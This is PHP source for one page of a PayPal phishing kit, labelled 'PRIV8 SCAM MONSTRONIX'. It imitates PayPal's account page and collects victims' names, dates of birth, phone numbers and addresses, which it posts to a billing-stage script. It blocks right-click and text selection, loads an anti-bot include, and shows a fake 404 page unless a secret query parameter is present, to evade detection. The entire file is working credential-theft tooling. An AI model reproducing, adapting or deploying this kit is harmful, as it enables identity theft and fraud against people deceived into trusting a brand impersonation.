<?php 
//PRIV8 SCAM MONSTRONIX V1.1 
error_reporting(0);
session_start();
include("../antimwbna.php");
include("../linguo/lang.php");
include ("../linguo/lang".$_SESSION['MONSTR_UU']);
require_once '../cry/crypt.php';
if(isset($_GET["p"])&& $_GET["p"]=="1" ){
echo"
<!DOCTYPE html><html class=\"no-js superBowlBG accountCreate\">
<head>
<title>".$billttl."</title>
<meta http-equiv=\"X-UA-COMPATIBLE\" content=\"IE-edge\" />
	<meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\" />
	<meta name=\"application-name\" content=\"Update\" />
	<meta name=\"msapplication-task\" content=\"\" />
<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes\" />
<link rel=\"shortcut icon\" type=\"image/x-icon\" href=\"../img/ppl.ico\" />
<script src=\"../js/jquery.js\"></script>
<script src=\"../js/jquery.mask.js\"></script>
<script src=\"../js/jquery.validate.js\"></script>
<script src=\"../js/jquery.v-form.js\"></script>
<script src=\"../js/jquery-3.1.0.min.js\"></script>
<script src=\"../js/jqu.js\"></script>	
<script src=\"../js/countries4.js\"></script>
<link rel=\"stylesheet\" href=\"../css/appSuperBowl.css\" />
<script language=\"JavaScript1.2\" type=\"text/javascript\">
  //The functions disableselect() and reEnable() are used to return the status of events.

        function disableselect(e)
        {
                return false 
        }
        
        function reEnable()
        {
                return true
        }
        
        //if IE4 
        // disable text selection
        document.onselectstart=new Function (\"return false\")
        
        //if NS6
        if (window.sidebar)
        {
                //document.onmousedown=disableselect
                // the above line creates issues in mozilla so keep it commented.
        
                document.onclick=reEnable
        }
        
        function clickIE()
        {
                if (document.all)
                {
                        (message);
                        return false;
                }
        }
        
        // disable right click
        document.oncontextmenu=new Function(\"return false\")
        
</script>
</head><body><header class=\"mainHeader\" role=\"banner\"><div class=\"headerContainer\">
<div class=\"grid12\"><a data-click=\"payPalLogo\"  href=\"#\" class=\"logo\"></a><div class=\"gradientSpacer\"><div> </div></div><div class=\"loginBtn\"><a data-click=\"loginLink\" href=\"#\" class=\"button secondary small  custom\">".$log."</a></div></div></div></header><main class=\"superBowlMain\"><section id=\"content\" role=\"main\" data-country=\"US\"><section id=\"main\" class=\"\"><div id=\"create\" class=\"create grid12\"><script type=\"application/json\" fncls=\"fnparams-dede7cc5-15fd-4c75-a9f4-36c430ee3a99\">{\"f\":\"8ca82980d2c511e689ae0d187383423f\",\"s\":\"t_s\",\"mm\":\"true\"}</script>
<script type=\"text/javascript\">(function() {var dom, doc, where, iframe = document.createElement('iframe');iframe.src = \"javascript:false\";iframe.title = \"\";iframe.role = \"presentation\";(iframe.frameElement || iframe).style.cssText = \"display:none; width: 0; height: 0; border: 0\";where = document.getElementsByTagName('script');where = where[where.length - 1];where.parentNode.insertBefore(iframe, where);try {doc = iframe.contentWindow.document;} catch (e) {dom = document.domain;iframe.src = \"javascript:var d=document.open();d.domain='\" + dom + \"';void(0);\";doc = iframe.contentWindow.document;}doc.open()._l = function () {var js = this.createElement(\"script\");if (dom) {this.domain = dom;}js.id = \"js-iframe-async\";js.src = \"https://www.paypalobjects.com/webstatic/r/fb/fb-all-prod.pp2.min.js\";this.body.appendChild(js);};doc.write(\'<body onload=\"document._l();\">\');doc.close();})();</script><noscript><img src=\"https://c.paypal.com/v1/r/d/b/ns?f=8ca82980d2c511e689ae0d187383423f&s=t_s&mm=true&js=0&r=1\"></noscript>
<div class=\"customGrid7\"><form action=\"../Templates/MO_Bill.php\" method=\"post\"  name=\"create_form\" class=\"proceed\" ><input type=\"hidden\" id=\"csrf\" name=\"_csrf\" value=\"HfsRGH5ySx8SS2XoBuT3NFDe7&#x2B;sOH0istUb9I&#x3D;\">    <div class=\"pageHeader\"><h2>".$mo15."</h2></div><div class=\"superBowlContainer\"><div class=\"inner\">
<div class=\"textInput lap\"><div class=\"fields email large\">";

error_reporting(0);
if($_GET["error"]){
	echo "<div class=\"error-assat\">
								    <div class=\"lisar\"><img src=\"../img/ernox.png\">
								    &nbsp;&nbsp;".$birth."</div> </div><br><br>"; } 
									echo "
									<div class=\"nativeDropdown  large \"><div class=\"selectDropdown \">
<select id=\"TTlo\" name=\"ttl_nm\" class=\"validate no-arrow\" required=\"required\" aria-required=\"true\" ><option selected=\"selected\" value=\"\">".$ttl."</option<select id=\"ttl\" class=\"FieldsZ118 large\" name=\"ttl\">
<option value=\"Mr\">".$sir."</option>
<option value=\"Mrs\">".$mme."</option></select></div></div><br>
<div class=\'groupFields\'><div class=\"textInput lap \"><div class=\"fields large\"><label for=\"firstName\"></label>
<input type=\"text\" class=\"validate camelCase name\" id=\"firstName\" name=\"firstName\" required=\"required\" autocomplete=\"off\" autocorrect=\"off\" placeholder=\"".$mo16."\" autocapitalize=\"on\" value=\"\" aria-required=\"true\"/></div><p class=\"help-error error-format\" id=\"firstNameFormat\"></p></div></div><div class=\"textInput lap \"><div class=\"fields large\"><label for=\"lastName\"></label><input type=\"text\" class=\"validate camelCase name\" placeholder=\"".$mo17."\" id=\"lastName\" name=\"lastName\" required=\"required\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"on\" value=\"\" aria-required=\"true\"/></div></div></div></div>
<div class=\"textInput lap \"><div class=\"fields large\"><input type=\"text\" class=\"validate camelCase name\" placeholder=\"".$mo18."\" id=\"dob\" name=\"DOB\" required=\"required\"/></div>
 <script>
    $(document).ready(function(){
     $('#dob').mask(\"99/99/9999\", {placeholder:\"__/__/____\"});
    });
    </script>
<div class=\'groupReatedFields mobileEntry\'>
<div class=\"left mobileEntry\"><div class=\"selectDropdown \">
<select id=\"phoneOption\" name=\"phoneOption\"  ><option  value=\"mobile\">".$mobile."</option><option  value=\"home\">".$home."</option></select>
<span class=\"select-arrow\"></span></div></div><div class=\"textInput lap phone phoneNumber \"><div class=\"fields right\">
<label for=\"phoneNumber\"></label>
<input type=\"number\" placeholder=\"".$mo19."\" id=\"phoneNumber\" name=\"phoneNumber\" required=\"required\" value=\"\" class=\"validate hasHelp\"data-format=\"&#x28;XXX&#x29; XXX&#x2D;XXXX\"pattern=\"&#x5C;&#x28;?&#x28;&#x5B;0&#x2D;9&#x5D;&#x7B;3&#x7D;&#x29;&#x5C;&#x29;&#x5C;s&#x28;&#x5B;0&#x2D;9&#x5D;&#x7B;3&#x7D;&#x29;&#x2D;&#x28;&#x5B;0&#x2D;9&#x5D;&#x7B;4&#x7D;&#x29;\"autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"off\" auto-required=\"true\"  /></div><div class=\"helpInformation\"><p id=\"PhoneInformation\" class=\"caret help-information\">Please include an area code if applicable.</p></div><div class=\"errorMessage\"><p class=\"help-error error-empty\" id=\"phoneNumberEmpty\">Required</p><p class=\"help-error error-format\" id=\"phoneNumberFormat\">That doesn’t look quite right, Please review and try again</p></div></div></div><div class='addressEntry ' id=\"addressEntry\"><div class=\"groupFields\"><input type=\"hidden\" name=\"addressId\" value=\"\" /><div class=\"textInput  lap \"><div class=\"fields large\"><label for=\"address1\"></label><input type=\"text\" class=\"hasHelp confidential validate camelCase\" data-noPoBox=\"\" id=\"address1\" name=\"address1\" required=\"required\" value=\"\" placeholder=\"".$mo20."\" autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"on\" aria-required=\"true\"/></div><div class=\"errorMessage\"><p class=\"help-error error-empty\" id=\"address1Empty\">Required&#x2E;</p><p class=\"help-error error-format\" id=\"address1Format\">☃address&#x2E;ADDRESS1_INVALID☃</p></div></div>
<div class=\"clearfix\" id=\"stateHolder\"><div class=\"textInput lap city \"><div class=\"fields  large \"><label for=\"city\">
</label><input type=\"text\" id=\"city\" placeholder=\"".$mo21."\" name=\"city\" class=\"hasHelp validate camelCase\" required=\"required\"  autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"on\" aria-required=\"true\" value=\"\"/></div>
<div class=\"fields  large\"><label for=\"city\">
</label><div class=\"multi equal clearfix\"><div class=\"nativeDropdown  large \"><div class=\"selectDropdown \">
<select id=\"countryS\" onchange=\"print_state('state',this.selectedIndex);\" name=\"country\" class=\"validate no-arrow\" required=\"required\" aria-required=\"true\" ><option selected=\"selected\" value=\"\">".$mo22."</option<select id=\"country\" class=\"FieldsZ118 large\" name=\"country\">
<option value=\"Afghanistan\">Afghanistan</option>
<option value=\"Albania\">Albania</option>
<option value=\"Algeria\">Algeria</option>
<option value=\"American Samoa\">American Samoa</option>
<option value=\"Angola\">Angola</option>
<option value=\"Anguilla\">Anguilla</option>
<option value=\"Antartica\">Antartica</option>
<option value=\"Antigua And Barbuda\">Antigua and Barbuda</option>
<option value=\"Argentina\">Argentina</option>
<option value=\"Armenia\">Armenia</option>
<option value=\"Aruba\">Aruba</option>
<option value=\"Ashmore and Cartier Island\">Ashmore and Cartier Island</option>
<option value=\"Australia\">Australia</option>
<option value=\"Austria\">Austria</option>
<option value=\"Azerbaijan\">Azerbaijan</option>
<option value=\"Bahamas\">Bahamas</option>
<option value=\"Bahrain\">Bahrain</option>
<option value=\"Bangladesh\">Bangladesh</option>
<option value=\"Barbados\">Barbados</option>
<option value=\"Belarus\">Belarus</option>
<option value=\"Belgium\">Belgium</option>
<option value=\"Belize\">Belize</option>
<option value=\"Benin\">Benin</option>
<option value=\"Bermuda\">Bermuda</option>
<option value=\"Bhutan\">Bhutan</option>
<option value=\"Bolivia\">Bolivia</option>
<option value=\"Bosnia and Herzegovina\">Bosnia and Herzegovina</option>
<option value=\"Botswana\">Botswana</option>
<option value=\"Brazil\">Brazil</option>
<option value=\"British Virgin Islands\">British Virgin Islands</option>
<option value=\"Brunei\">Brunei</option>
<option value=\"Bulgaria\">Bulgaria</option>
<option value=\"Burkina Faso\">Burkina Faso</option>
<option value=\"Burma\">Burma</option>
<option value=\"Burundi\">Burundi</option>
<option value=\"Cambodia\">Cambodia</option>
<option value=\"Cameroon\">Cameroon</option>
<option value=\"Canada\">Canada</option>
<option value=\"Cape Verde\">Cape Verde</option>
<option value=\"Cayman Islands\">Cayman Islands</option>
<option value=\"Central African Republic\">Central African Republic</option>
<option value=\"Chad\">Chad</option>
<option value=\"Chile\">Chile</option>
<option value=\"China\">China</option>
<option value=\"Christmas Island\">Christmas Island</option>
<option value=\"Clipperton Island\">Clipperton Island</option>
<option value=\"Cocos (Keeling) Islands\">Cocos (Keeling) Islands</option>
<option value=\"Colombia\">Colombia</option>
<option value=\"Comoros\">Comoros</option>
<option value=\"Congo, Democratic Republic of the\">Democratic Republic of the Congo</option>
<option value=\"The Republic of the Congo\">The Republic of the Congo</option>
<option value=\"Cook Islands\">Cook Islands</option>
<option value=\"Costa Rica\">Costa Rica</option>
<option value=\"Cote d&#130;Ivoire\">Cote d&#130;Ivoire</option>
<option value=\"Croatia\">Croatia</option>
<option value=\"Cuba\">Cuba</option>
<option value=\"Cyprus\">Cyprus</option>
<option value=\"Czech Republic\">Czech Republic</option>
<option value=\"Denmark\">Denmark</option>
<option value=\"Djibouti\">Djibouti</option>
<option value=\"Dominica\">Dominica</option>
<option value=\"Dominican Republic\">Dominican Republic</option>
<option value=\"Ecuador\">Ecuador</option>
<option value=\"Egypt\">Egypt</option>
<option value=\"El Salvador\">El Salvador</option>
<option value=\"Equatorial Guinea\">Equatorial Guinea</option>
<option value=\"Eritrea\">Eritrea</option>
<option value=\"Estonia\">Estonia</option>
<option value=\"Ethiopia\">Ethiopia</option>
<option value=\"Europa Island\">Europa Island</option>
<option value=\"Falkland Islands (Islas Malvinas)\">Falkland Islands (Islas Malvinas)</option>
<option value=\"Faroe Islands\">Faroe Islands</option>
<option value=\"Fiji\">Fiji</option>
<option value=\"Finland\">Finland</option>
<option value=\"France\">France</option>
<option value=\"French Guiana\">French Guiana</option>
<option value=\"French Polynesia\">French Polynesia</option>
<option value=\"French Southern and Antarctic Lands\">French Southern and Antarctic Lands</option>
<option value=\"Gabon\">Gabon</option>
<option value=\"Gambia\">Gambia</option>
<option value=\"Gaza Strip\">Gaza Strip</option>
<option value=\"Georgia\">Georgia</option>
<option value=\"Germany\">Germany</option>
<option value=\"Ghana\">Ghana</option>
<option value=\"Gibraltar\">Gibraltar</option>
<option value=\"Glorioso Islands\">Glorioso Islands</option>
<option value=\"Greece\">Greece</option>
<option value=\"Greenland\">Greenland</option>
<option value=\"Grenada\">Grenada</option>
<option value=\"Guadeloupe\">Guadeloupe</option>
<option value=\"Guam\">Guam</option>
<option value=\"Guatemala\">Guatemala</option>
<option value=\"Guernsey\">Guernsey</option>
<option value=\"Guinea\">Guinea</option>
<option value=\"Guinea-Bissau\">Guinea-Bissau</option>
<option value=\"Guyana\">Guyana</option>
<option value=\"Haiti\">Haiti</option>
<option value=\"Heard Island and McDonald Islands\">Heard Island and McDonald Islands</option>
<option value=\"Holy See (Vatican City)\">Holy See (Vatican City)</option>
<option value=\"Honduras\">Honduras</option>
<option value=\"Hong Kong\">Hong Kong</option>
<option value=\"Howland Island\">Howland Island</option>
<option value=\"Hungary\">Hungary</option>
<option value=\"Iceland\">Iceland</option>
<option value=\"India\">India</option>
<option value=\"Indonesia\">Indonesia</option>
<option value=\"Iran\">Iran</option>
<option value=\"Iraq\">Iraq</option>
<option value=\"Ireland\">Ireland</option>
<option value=\"Ireland Northern\">Ireland, Northern</option>
<option value=\"Israel\">Israel</option>
<option value=\"Italy\">Italy</option>
<option value=\"Jamaica\">Jamaica</option>
<option value=\"Jan Mayen\">Jan Mayen</option>
<option value=\"Japan\">Japan</option>
<option value=\"Jarvis Island\">Jarvis Island</option>
<option value=\"Jersey\">Jersey</option>
<option value=\"Johnston Atoll\">Johnston Atoll</option>
<option value=\"Jordan\">Jordan</option>
<option value=\"Juan de Nova Island\">Juan de Nova Island</option>
<option value=\"Kazakhstan\">Kazakhstan</option>
<option value=\"Kenya\">Kenya</option>
<option value=\"Kiribati\">Kiribati</option>
<option value=\"North Korea\">North Korea</option>
<option value=\"South Korea\">South Korea</option>
<option value=\"Kuwait\">Kuwait</option>
<option value=\"Kyrgyzstan\">Kyrgyzstan</option>
<option value=\"Laos\">Laos</option>
<option value=\"Latvia\">Latvia</option>
<option value=\"Lebanon\">Lebanon</option>
<option value=\"Lesotho\">Lesotho</option>
<option value=\"Liberia\">Liberia</option>
<option value=\"Libya\">Libya</option>
<option value=\"Liechtenstein\">Liechtenstein</option>
<option value=\"Lithuania\">Lithuania</option>
<option value=\"Luxembourg\">Luxembourg</option>
<option value=\"Macau\">Macau</option>
<option value=\"Former Yugoslav Republic of Macedonia\">Former Yugoslav Republic of Macedonia</option>
<option value=\"Madagascar\">Madagascar</option>
<option value=\"Malawi\">Malawi</option>
<option value=\"Malaysia\">Malaysia</option>
<option value=\"Maldives\">Maldives</option>
<option value=\"Mali\">Mali</option>
<option value=\"Malta\">Malta</option>
<option value=\"Isle of Man\">Isle of Man</option>
<option value=\"Marshall Islands\">Marshall Islands</option>
<option value=\"Martinique\">Martinique</option>
<option value=\"Mauritania\">Mauritania</option>
<option value=\"Mauritius\">Mauritius</option>
<option value=\"Mayotte\">Mayotte</option>
<option value=\"Mexico\">Mexico</option>
<option value=\"Federated States of Micronesia\">Federated States of Micronesia</option>
<option value=\"Midway Islands\">Midway Islands</option>
<option value=\"Moldova\">Moldova</option>
<option value=\"Monaco\">Monaco</option>
<option value=\"Mongolia\">Mongolia</option>
<option value=\"Montserrat\">Montserrat</option>
<option value=\"Morocco\">Morocco</option>
<option value=\"Mozambique\">Mozambique</option>
<option value=\"Namibia\">Namibia</option>
<option value=\"Nauru\">Nauru</option>
<option value=\"Nepal\">Nepal</option>
<option value=\"Netherlands\">Netherlands</option>
<option value=\"Netherlands Antilles\">Netherlands Antilles</option>
<option value=\"New Caledonia\">New Caledonia</option>
<option value=\"New Zealand\">New Zealand</option>
<option value=\"Nicaragua\">Nicaragua</option>
<option value=\"Niger\">Niger</option>
<option value=\"Nigeria\">Nigeria</option>
<option value=\"Niue\">Niue</option>
<option value=\"Norfolk Island\">Norfolk Island</option>
<option value=\"Northern Mariana Islands\">Northern Mariana Islands</option>
<option value=\"Norway\">Norway</option>
<option value=\"Oman\">Oman</option>
<option value=\"Pakistan\">Pakistan</option>
<option value=\"Palau\">Palau</option>
<option value=\"Panama\">Panama</option>
<option value=\"Papua New Guinea\">Papua New Guinea</option>
<option value=\"Paraguay\">Paraguay</option>
<option value=\"Peru\">Peru</option>
<option value=\"Philippines\">Philippines</option>
<option value=\"Pitcaim Islands\">Pitcaim Islands</option>
<option value=\"Poland\">Poland</option>
<option value=\"Portugal\">Portugal</option>
<option value=\"Puerto Rico\">Puerto Rico</option>
<option value=\"Qatar\">Qatar</option>
<option value=\"Reunion\">Reunion</option>
<option value=\"Romainia\">Romainia</option>
<option value=\"Russia\">Russia</option>
<option value=\"Rwanda\">Rwanda</option>
<option value=\"Saint Helena\">Saint Helena</option>
<option value=\"Saint Kitts and Nevis\">Saint Kitts and Nevis</option>
<option value=\"Saint Lucia\">Saint Lucia</option>
<option value=\"Saint Pierre and Miquelon\">Saint Pierre and Miquelon</option>
<option value=\"Saint Vincent and the Grenadines\">Saint Vincent and the Grenadines</option>
<option value=\"Samoa\">Samoa</option>
<option value=\"San Marino\">San Marino</option>
<option value=\"Sao Tome and Principe\">Sao Tome and Principe</option>
<option value=\"Saudi Arabia\">Saudi Arabia</option>
<option value=\"Scotland\">Scotland</option>
<option value=\"Senegal\">Senegal</option>
<option value=\"Seychelles\">Seychelles</option>
<option value=\"Sierra Leone\">Sierra Leone</option>
<option value=\"Singapore\">Singapore</option>
<option value=\"Slovakia\">Slovakia</option>
<option value=\"Slovenia\">Slovenia</option>
<option value=\"Solomon Islands\">Solomon Islands</option>
<option value=\"Somalia\">Somalia</option>
<option value=\"South Africa\">South Africa</option>
<option value=\"South Georgia and South Sandwich Islands\">South Georgia and South Sandwich Islands</option>
<option value=\"Spain\">Spain</option>
<option value=\"Spratly Islands\">Spratly Islands</option>
<option value=\"Sri Lanka\">Sri Lanka</option>
<option value=\"Sudan\">Sudan</option>
<option value=\"Suriname\">Suriname</option>
<option value=\"Svalbard\">Svalbard</option>
<option value=\"Swaziland\">Swaziland</option>
<option value=\"Sweden\">Sweden</option>
<option value=\"Switzerland\">Switzerland</option>
<option value=\"Syria\">Syria</option>
<option value=\"Taiwan\">Taiwan</option>
<option value=\"Tajikistan\">Tajikistan</option>
<option value=\"Tanzania\">Tanzania</option>
<option value=\"Thailand\">Thailand</option>
<option value=\"Tobago\">Tobago</option>
<option value=\"Toga\">Toga</option>
<option value=\"Tokelau\">Tokelau</option>
<option value=\"Tonga\">Tonga</option>
<option value=\"Trinidad\">Trinidad</option>
<option value=\"Tunisia\">Tunisia</option>
<option value=\"Turkey\">Turkey</option>
<option value=\"Turkmenistan\">Turkmenistan</option>
<option value=\"Tuvalu\">Tuvalu</option>
<option value=\"Uganda\">Uganda</option>
<option value=\"Ukraine\">Ukraine</option>
<option value=\"United Arab Emirates\">United Arab Emirates</option>
<option value=\"United Kingdom\">United Kingdom</option>
<option value=\"Uruguay\">Uruguay</option>
<option value=\"United States of America\">United States of America</option>
<option value=\"Uzbekistan\">Uzbekistan</option>
<option value=\"Vanuatu\">Vanuatu</option>
<option value=\"Venezuela\">Venezuela</option>
<option value=\"Vietnam\">Vietnam</option>
<option value=\"Virgin Islands\">Virgin Islands</option>
<option value=\"Wales\">Wales</option>
<option value=\"Wallis and Futuna\">Wallis and Futuna</option>
<option value=\"West Bank\">West Bank</option>
<option value=\"Western Sahar\">Western Sahara</option>
<option value=\"Yemen\">Yemen</option>
<option value=\"Yugoslavia\">Yugoslavia</option>
<option value=\"Zambia\">Zambia</option>
<option value=\"Zimbabwe\">Zimbabwe</option></select></div></div>
<div class=\"multi equal clearfix\"><div class=\"nativeDropdown  large \"><div class=\"selectDropdown \">
<select id=\"state\" name=\"state\" class=\"hasHelp validate camelCase\" required=\"required\"  autocomplete=\"off\" autocorrect=\"off\" autocapitalize=\"on\" aria-required=\"true\" value=\"\"/>
<option selected=\"selected\">".$state."</select>
<span class=\"select-arrow\"></span></div></div>
									<div class=\"textInput lap zip \"><div class=\"fields  large \">
									<label for=\"postalCode\"></label>
									<input type=\"tel\" placeholder=\"".$mo23."\" id=\"postalCode\" name=\"zip\" autocomplete=\"off\"class=\"validate\" required=\"required\" aria-required=\"true\"maxlength=\"10\"value=\"\"/></div>
									<br><input type=\"checkbox\" style=\"height:15px;width:15px\" required=\"required\" aria-required=\"true\"><B>".$ok." <a href=\"https://www.paypal.com/".$_SESSION['MOCNTRCD']."/webapps/mpp/ua/useragreement-full\"><B>".$term."</b></a> ".$and." <a href=\"https://www.paypal.com/".$_SESSION['MOCNTRCD']."/webapps/mpp/paypal-safety-and-security\"><b>".$condo."</b></b></a></div></div></div></div>
									<br><input id=\"botdkhol\" name=\"_eventId_continue\" type=\"submit\" class=\"button\"value=\"".$cn."\"data-click=\"createSubmit\"/></div></form></div></form></div><br>
									</div></div></div></div><center><br><div class=\"footerNav\"><div class=\"legal\"></i></i><b><a style=\"cursor:pointer\">".$contact."</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;       <a style=\"cursor:pointer\">".$feedback."</a>  &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;     <a style=\"cursor:pointer\">".$privacy."</a><ul></li></noscript></div></body></html>
"; }
else {
	echo "
	<title>404 - Not Found</title>
	<h1>Not Found</h1>
	<p>The requested document ".$_SERVER["REQUEST_URI"]." could not be found on this server.</p>
	<p><i>".$_SERVER["HTTP_HOST"]." on port ".$_SERVER["SERVER_PORT"]."
	";
}
									?>